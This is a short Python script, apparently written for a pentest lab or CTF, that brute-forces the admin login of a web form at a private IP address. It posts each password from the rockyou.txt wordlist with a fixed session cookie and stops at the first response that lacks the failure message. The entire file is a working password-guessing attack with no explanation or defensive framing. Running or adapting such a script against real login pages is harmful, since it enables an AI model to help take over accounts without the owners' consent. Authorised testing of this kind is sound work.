import requests

url = "http://10.114.187.23/login.php"

headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": url,
    "Origin": "http://10.114.187.23",
}

cookies = {
    "PHPSESSID": "7gjqvlb8p9ocpcer11bu5v83kv"
}

username = "admin"

with open('/home/Aymen/pentest-wordlists/rockyou.txt', 'r', encoding="latin-1") as f:
    passwords = [line.strip() for line in f if line.strip()]

session = requests.Session()
session.cookies.update(cookies)
valids = []
for password in passwords:
    response = session.post(
        url,
        headers=headers,
        data={
            "username": username,
            "password": password,
        },
    )

    if "Invalid username or password" in response.text:
        print(f"[-] {password}: Invalid password!")
        continue

    print(f"[+] Possible valid password: {password}")
    valids.append(password)
    break
    
